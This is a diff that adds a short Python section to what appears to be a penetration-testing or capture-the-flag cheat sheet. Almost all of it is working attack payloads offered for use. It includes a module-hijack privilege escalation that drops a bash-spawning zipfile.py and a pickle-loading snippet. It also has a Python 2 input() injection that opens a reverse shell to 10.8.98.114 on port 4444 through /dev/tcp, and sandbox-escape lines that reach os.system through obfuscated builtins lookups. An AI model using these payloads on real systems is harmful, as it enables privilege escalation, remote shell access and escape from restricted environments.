@@ -1,0 +1,25 @@
+### python ###
+
+## import privesc
+echo 'import pty; pty.spawn("/bin/bash")' > zipfile.py
+
+
+## pickle
+https://root4loot.com/post/exploiting_cpickle/
+import pickle
+f = open('./pickle', 'rb')
+data = pickle.load(f)
+print(data)
+
+
+## python 2 input()
+__import__("os").system("/bin/bash -c 'bash -i >& /dev/tcp/10.8.98.114/4444 0>&1 2>&1'")
+__import__('os').system('bash')
+
+
+## python jail escape
+print(dir(__builtins__))
+print(__builtins__.__dict__)
+print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()))
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('ls')
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('bash')
